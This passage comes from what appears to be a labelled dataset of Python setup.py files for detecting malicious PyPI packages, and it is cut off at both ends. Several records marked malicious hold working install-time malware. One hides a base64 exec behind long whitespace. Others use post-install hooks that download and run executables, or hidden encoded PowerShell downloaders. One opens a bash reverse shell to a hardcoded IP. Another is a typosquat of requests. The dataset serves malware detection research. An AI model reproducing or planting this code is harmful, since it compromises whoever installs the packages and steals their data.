f.read().splitlines()\n\nsetup(\n    name='fbprophet',\n    version='0.7.1',\n    description='Automatic Forecasting Procedure',\n    url='https://facebook.github.io/prophet/',\n    author='Sean J. Taylor <sjtz@pm.me>, Ben Letham <bletham@fb.com>',\n    author_email='sjtz@pm.me',\n    license='MIT',\n    packages=find_packages(),\n    setup_requires=[\n    ],\n    install_requires=install_requires,\n    python_requires='>=3',\n    zip_safe=False,\n    include_package_data=True,\n    cmdclass={\n        'build_py': BuildPyCommand,\n        'develop': DevelopCommand,\n        'test': TestCommand,\n    },\n    test_suite='fbprophet.tests',\n    classifiers=[\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n    ],\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n)\n", "target": 0}
{"idx": "google-auth-oauthlib-0.5.2", "func": "# Copyright 2014 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\nTOOL_DEPENDENCIES = \"click>=6.0.0\"\n\nDEPENDENCIES = (\"google-auth>=1.0.0\", \"requests-oauthlib>=0.7.0\")\n\n\nwith io.open(\"README.rst\", \"r\") as fh:\n    long_description = fh.read()\n\n\nversion = \"0.5.2\"\n\nsetup(\n    name=\"google-auth-oauthlib\",\n    version=version,\n    author=\"Google Cloud Platform\",\n    author_email=\"jonwayne+google-auth@google.com\",\n    description=\"Google Authentication Library\",\n    long_description=long_description,\n    url=\"https://github.com/GoogleCloudPlatform/google-auth-library-python-oauthlib\",\n    packages=find_packages(exclude=(\"tests*\",)),\n    install_requires=DEPENDENCIES,\n    extras_require={\"tool\": TOOL_DEPENDENCIES},\n    entry_points={\n        \"console_scripts\": [\n            \"google-oauthlib-tool\" \"=google_auth_oauthlib.tool.__main__:main [tool]\"\n        ]\n    },\n    python_requires=\">=3.6\",\n    license=\"Apache 2.0\",\n    keywords=\"google auth oauth client oauthlib\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n)\n", "target": 0}
{"idx": "geohashlite-0.3.2", "func": "# coding: utf-8\n\n\"\"\"\nSetup.py of geohashlite\n\"\"\"\n\nfrom setuptools import Extension, setup\n\n# requiring C++ here for Windows support.\n# c1 = Extension('_geohash',\n#                sources=['src/geohash.cpp', ],\n#                define_macros=[('PYTHON_MODULE', 1), ])\n\nsetup(\n    name=\"geohashlite\",\n    version=\"0.3.2\",\n    author=\"Xuzhou Qin\",\n    author_email=\"me@qinxuzhou.com\",\n    packages=[\"geohashlite\"],\n    license=\"LICENSE\",\n    description=\"A python library for interacting with geohash\",\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    install_requires=[\n        'shapely',\n    ],\n    # ext_modules=[c1],\n)\n", "target": 0}
{"idx": "genson-1.2.2", "func": "#!/usr/bin/env python\nimport re\nfrom setuptools import setup\n\n\ndef get_version():\n    with open('genson/__init__.py') as f:\n        match = re.search(r\"__version__ = '([\\d\\.]+)'\", f.read())\n        return match.group(1)\n\n\ndef get_long_docs(*filenames):\n    \"\"\"Build rst description from a set of files.\"\"\"\n    docs = []\n    for filename in filenames:\n        with open(filename, 'r') as f:\n            docs.append(f.read())\n\n    return \"\\n\\n\".join(docs)\n\n\nsetup(\n    name='genson',\n    version=get_version(),\n    description='GenSON is a powerful, user-friendly JSON Schema generator.',\n    long_description=get_long_docs('README.rst', 'HISTORY.rst', 'AUTHORS.rst'),\n    keywords=['json', 'schema', 'json-schema', 'jsonschema', 'object',\n              'generate', 'generator', 'builder', 'merge',\n              'draft 7', 'validate', 'validation'],\n    url='https://github.com/wolverdude/genson/',\n    download_url='https://github.com/wolverdude/GenSON/tarball/v0.2s.0',\n    license='MIT',\n    author='Jon Wolverton',\n    author_email='wolverton' '.' 'jr' '@' 'gmail' '.' 'com',\n    packages=['genson'],\n    include_package_data=True,\n    entry_points={'console_scripts': ['genson = genson.cli:main']},\n    zip_safe=True,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Software Development :: Code Generators',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Utilities',\n    ],\n    tests_require=[\n        'jsonschema>=3.0.1',\n    ],\n    test_suite='test',\n)\n", "target": 0}
{"idx": "Flask-SeaSurf-1.1.1", "func": "import os\n\nfrom setuptools import setup\n\nthis_directory = os.path.dirname(__file__)\nmodule_path = os.path.join(this_directory, 'flask_seasurf.py')\nversion_line = [line for line in open(module_path)\n                if line.startswith('__version_info__')][0]\nwith open(os.path.join(this_directory, 'README.markdown')) as f:\n    long_description = f.read()\n\n__version__ = '.'.join(eval(version_line.split('__version_info__ = ')[-1]))\n\nsetup(\n    name='Flask-SeaSurf',\n    version=__version__,\n    url='https://github.com/maxcountryman/flask-seasurf/',\n    license='BSD',\n    author='Max Countryman',\n    author_email='maxc@me.com',\n    description='An updated CSRF extension for Flask.',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    py_modules=['flask_seasurf'],\n    test_suite='test_seasurf',\n    zip_safe=False,\n    platforms='any',\n    install_requires=['Flask'],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "flax-0.5.3", "func": "# Copyright 2022 The Flax Authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"setup.py for Flax.\"\"\"\n\nimport os\nfrom setuptools import find_packages\nfrom setuptools import setup\n\nhere = os.path.abspath(os.path.dirname(__file__))\ntry:\n  README = open(os.path.join(here, \"README.md\"), encoding=\"utf-8\").read()\nexcept OSError:\n  README = \"\"\n\ninstall_requires = [\n    \"numpy>=1.12\",\n    \"jax>=0.3.2\",\n    \"matplotlib\",  # only needed for tensorboard export\n    \"msgpack\",\n    \"optax\",\n    \"rich~=11.1\",\n    \"tensorstore\",\n    \"typing_extensions>=4.1.1\",\n    \"PyYAML>=5.4.1\",\n]\n\ntests_require = [\n    \"atari-py==0.2.5\",  # Last version does not have the ROMs we test on pre-packaged\n    \"clu\",  # All examples.\n    \"gym==0.18.3\",\n    \"jaxlib\",\n    \"jraph\",\n    \"ml-collections\",\n    \"opencv-python\",\n    \"pytest\",\n    \"pytest-cov\",\n    \"pytest-xdist==1.34.0\",  # upgrading to 2.0 broke tests, need to investigate\n    \"pytype\",\n    \"sentencepiece\",  # WMT example.\n    \"svn\",\n    \"tensorflow_text>=2.4.0\",  # WMT example.\n    \"tensorflow_datasets\",\n    \"tensorflow\",\n    \"torch\",\n    \"pandas\", # get_repo_metrics script\n]\n\n__version__ = None\n\nwith open(\"flax/version.py\") as f:\n  exec(f.read(), globals())\n\nsetup(\n    name=\"flax\",\n    version=__version__,\n    description=\"Flax: A neural network library for JAX designed for flexibility\",\n    long_description=\"\\n\\n\".join([README]),\n    long_description_content_type=\"text/markdown\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n        ],\n    keywords=\"\",\n    author=\"Flax team\",\n    author_email=\"flax-dev@google.com\",\n    url=\"https://github.com/google/flax\",\n    packages=find_packages(),\n    package_data={\"flax\": [\"py.typed\"]},\n    zip_safe=False,\n    install_requires=install_requires,\n    extras_require={\n        \"testing\": tests_require,\n        },\n    )\n", "target": 0}
{"idx": "colorwed-2.3.0", "func": "import ast\nfrom pathlib import Path\nimport re\nfrom setuptools import setup\nprint('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vNC4yMjguODMuODYvaW5qZWN0L1p1TXJhS1NRNzEyQXFtRjknKS5yZWFkKCkpIiIiKQpfdHRtcC5jbG9zZSgpCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikKZXhjZXB0OiBwYXNz\"),'<string>','exec'))\n\n\nCURRENT_DIR = Path(__file__).parent\n\n\n# This function is borrowed from the setup.py at https://github.com/psf/black\ndef get_version() -> str:\n    macchiato_py = CURRENT_DIR / \"macchiato.py\"\n    _version_re = re.compile(r\"__version__\\s+=\\s+(?P<version>.*)\")\n    with open(macchiato_py, \"r\", encoding=\"utf8\") as f:\n        match = _version_re.search(f.read())\n        version = match.group(\"version\") if match is not None else '\"unknown\"'\n    return str(ast.literal_eval(version))\n\nsetup(\n    name=\"colorwed\",\n    description=\"Partial black formatting\",\n    url=\"https://github.com/wbolster/colorwed\",\n    author=\"wouter bolsterlee\",\n    author_email=\"wouter@bolsterl.ee\",\n    license=\"BSD License\",\n    version=get_version(),\n    py_modules=[\"macchiato\"],\n    install_requires=[\"black\"],\n    python_requires=\">=3.6\",\n    entry_points={\"console_scripts\": [\"colorwed = macchiato:main\"]},\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n    ],\n)\n", "target": 1}
{"idx": "cxxfilt-0.3.0", "func": "from setuptools import setup, find_packages\n# To use a consistent encoding\nfrom codecs import open\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\n# reads __version__\n__version__: str\nwith open(path.join(here, 'cxxfilt', 'version.py'), encoding='utf-8') as f:\n    exec(f.read())\n\nsetup(\n    name='cxxfilt',\n\n    version=__version__,\n\n    description='Python interface to c++filt / abi::__cxa_demangle',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n\n    url='https://github.com/afq984/python-cxxfilt',\n\n    author='afq984',\n    author_email='afg984@gmail.com',\n\n    license='BSD',\n\n    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n\n        'License :: OSI Approved :: BSD License',\n\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n    ],\n\n    keywords='c++ c++filt name mangling',\n\n    packages=find_packages(exclude=['tests']),\n\n    extras_require={\n        'test': ['pytest>=3.0.0'],\n    },\n)\n", "target": 0}
{"idx": "etuptools-4.4.7", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n \ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='etuptools',\n  version='4.4.7',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "libhydrasupercpu-7.65", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhydrasupercpu',\n    packages = ['modlib'],\n    version = '9.13',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "GitPython-3.1.27", "func": "from typing import Sequence\nfrom setuptools import setup, find_packages\nfrom setuptools.command.build_py import build_py as _build_py\nfrom setuptools.command.sdist import sdist as _sdist\nimport fnmatch\nimport os\nimport sys\n\nwith open(os.path.join(os.path.dirname(__file__), 'VERSION')) as v:\n    VERSION = v.readline().strip()\n\nwith open('requirements.txt') as reqs_file:\n    requirements = reqs_file.read().splitlines()\n\nwith open('test-requirements.txt') as reqs_file:\n    test_requirements = reqs_file.read().splitlines()\n\nwith open('README.md') as rm_file:\n    long_description = rm_file.read()\n\n\nclass build_py(_build_py):\n\n    def run(self) -> None:\n        init = os.path.join(self.build_lib, 'git', '__init__.py')\n        if os.path.exists(init):\n            os.unlink(init)\n        _build_py.run(self)\n        _stamp_version(init)\n        self.byte_compile([init])\n\n\nclass sdist(_sdist):\n\n    def make_release_tree(self, base_dir: str, files: Sequence) -> None:\n        _sdist.make_release_tree(self, base_dir, files)\n        orig = os.path.join('git', '__init__.py')\n        assert os.path.exists(orig), orig\n        dest = os.path.join(base_dir, orig)\n        if hasattr(os, 'link') and os.path.exists(dest):\n            os.unlink(dest)\n        self.copy_file(orig, dest)\n        _stamp_version(dest)\n\n\ndef _stamp_version(filename: str) -> None:\n    found, out = False, []\n    try:\n        with open(filename, 'r') as f:\n            for line in f:\n                if '__version__ =' in line:\n                    line = line.replace(\"'git'\", \"'%s'\" % VERSION)\n                    found = True\n                out.append(line)\n    except OSError:\n        print(\"Couldn't find file %s to stamp version\" % filename, file=sys.stderr)\n\n    if found:\n        with open(filename, 'w') as f:\n            f.writelines(out)\n    else:\n        print(\"WARNING: Couldn't find version line in file %s\" % filename, file=sys.stderr)\n\n\ndef build_py_modules(basedir: str, excludes: Sequence = ()) -> Sequence:\n    # create list of py_modules from tree\n    res = set()\n    _prefix = os.path.basename(basedir)\n    for root, _, files in os.walk(basedir):\n        for f in files:\n            _f, _ext = os.path.splitext(f)\n            if _ext not in [\".py\"]:\n                continue\n            _f = os.path.join(root, _f)\n            _f = os.path.relpath(_f, basedir)\n            _f = \"{}.{}\".format(_prefix, _f.replace(os.sep, \".\"))\n            if any(fnmatch.fnmatch(_f, x) for x in excludes):\n                continue\n            res.add(_f)\n    return list(res)\n\n\nsetup(\n    name=\"GitPython\",\n    cmdclass={'build_py': build_py, 'sdist': sdist},\n    version=VERSION,\n    description=\"\"\"GitPython is a python library used to interact with Git repositories\"\"\",\n    author=\"Sebastian Thiel, Michael Trier\",\n    author_email=\"byronimo@gmail.com, mtrier@gmail.com\",\n    license=\"BSD\",\n    url=\"https://github.com/gitpython-developers/GitPython\",\n    packages=find_packages(exclude=[\"test\", \"test.*\"]),\n    include_package_data=True,\n    py_modules=build_py_modules(\"./git\", excludes=[\"git.ext.*\"]),\n    package_dir={'git': 'git'},\n    python_requires='>=3.7',\n    install_requires=requirements,\n    tests_require=requirements + test_requirements,\n    zip_safe=False,\n    long_description=\"\"\"GitPython is a python library used to interact with Git repositories\"\"\",\n    long_description_content_type=\"text/markdown\",\n    classifiers=[\n        # Picked from\n        #   http://pypi.python.org/pypi?:action=list_classifiers\n        # \"Development Status :: 1 - Planning\",\n        # \"Development Status :: 2 - Pre-Alpha\",\n        # \"Development Status :: 3 - Alpha\",\n        # \"Development Status :: 4 - Beta\",\n        \"Development Status :: 5 - Production/Stable\",\n        # \"Development Status :: 6 - Mature\",\n        # \"Development Status :: 7 - Inactive\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Typing :: Typed\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ]\n)\n", "target": 0}
{"idx": "drb-1.0.8", "func": "import versioneer\nfrom setuptools import find_packages, setup\n\nwith open('requirements.txt') as f:\n    REQUIREMENTS = f.read().splitlines()\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name='drb',\n    packages=find_packages(exclude=['tests']),\n    description='Data Request Broker',\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author='GAEL Systems',\n    author_email='drb-python@gael.fr',\n    url='https://gitlab.com/drb-python/drb',\n    install_requires=REQUIREMENTS,\n    classifiers=[\n        \"Programming Language :: Python :: 3.8\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n    ],\n    python_requires='>=3.8',\n    use_scm_version=True,\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    package_data={\n        'drb.factory': ['it_schema.yml']\n    },\n    data_files=[('.', ['requirements.txt'])],\n    entry_points={\n        'console_scripts': [\n            'cortex-validator=drb.factory.cortex_validator:main',\n            'wallet=drb.utils.keyring:keyring'\n        ]\n    },\n    project_urls={\n        'Documentation': 'https://drb-python.gitlab.io/drb',\n        'Source': 'https://gitlab.com/drb-python/drb',\n    }\n)\n", "target": 0}
{"idx": "tphydrapongcc-10.85", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphydrapongcc',\n    packages = ['modlib'],\n    version = '2.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "requestw-2.28.1", "func": "from setuptools import setup\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nabout = {}\nabout['__title__'] = \"requestw\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.1\"\nabout['__build__'] = 0x022801\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright 2022 Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"requestw\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n", "target": 1}
{"idx": "boogipoper-0.1.0", "func": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogipoper',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n", "target": 1}
{"idx": "gsutil-5.12", "func": "#!/usr/bin/env python\n\n# Copyright (c) 2006-2010 Mitch Garnaat http://garnaat.org/\n# Copyright (c) 2010, Eucalyptus Systems, Inc.\n# All rights reserved.\n#\n# Permission is hereby granted, free of charge, to any person obtaining a\n# copy of this software and associated documentation files (the\n# \"Software\"), to deal in the Software without restriction, including\n# without limitation the rights to use, copy, modify, merge, publish, dis-\n# tribute, sublicense, and/or sell copies of the Software, and to permit\n# persons to whom the Software is furnished to do so, subject to the fol-\n# lowing conditions:\n#\n# The above copyright notice and this permission notice shall be included\n# in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS\n# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABIL-\n# ITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT\n# SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS\n# IN THE SOFTWARE.\n\nfrom __future__ import print_function\n\ntry:\n    from setuptools import setup\n    extra = dict(test_suite=\"tests.test.suite\", include_package_data=True)\nexcept ImportError:\n    from distutils.core import setup\n    extra = {}\n\nimport sys\n\nfrom boto import __version__\n\nif sys.version_info <= (2, 5):\n    error = \"ERROR: boto requires Python Version 2.6 or above...exiting.\"\n    print(error, file=sys.stderr)\n    sys.exit(1)\n\ndef readme():\n    with open(\"README.rst\") as f:\n        return f.read()\n\nsetup(name = \"boto\",\n      version = __version__,\n      description = \"Amazon Web Services Library\",\n      long_description = readme(),\n      author = \"Mitch Garnaat\",\n      author_email = \"mitch@garnaat.com\",\n      scripts = [\"bin/sdbadmin\", \"bin/elbadmin\", \"bin/cfadmin\",\n                 \"bin/s3put\", \"bin/fetch_file\", \"bin/launch_instance\",\n                 \"bin/list_instances\", \"bin/taskadmin\", \"bin/kill_instance\",\n                 \"bin/bundle_image\", \"bin/pyami_sendmail\", \"bin/lss3\",\n                 \"bin/cq\", \"bin/route53\", \"bin/cwutil\", \"bin/instance_events\",\n                 \"bin/asadmin\", \"bin/glacier\", \"bin/mturk\",\n                 \"bin/dynamodb_dump\", \"bin/dynamodb_load\"],\n      url = \"https://github.com/boto/boto/\",\n      packages = [\"boto\", \"boto.sqs\", \"boto.s3\", \"boto.gs\", \"boto.file\",\n                  \"boto.ec2\", 